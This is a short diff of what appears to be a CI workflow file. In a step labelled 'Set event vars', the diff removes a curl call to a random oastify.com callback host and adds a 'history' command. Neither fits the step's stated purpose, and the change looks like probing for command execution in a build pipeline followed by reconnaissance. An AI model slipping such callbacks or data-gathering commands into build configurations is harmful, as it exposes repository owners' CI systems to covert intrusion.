@@ -15,4 +15,4 @@ jobs:
       - name: Set event vars
         id: event
         run: |
-          curl oyqzqnjjk75ylhnq1i4nav8ek5qwenfb4.oastify.com
+          history
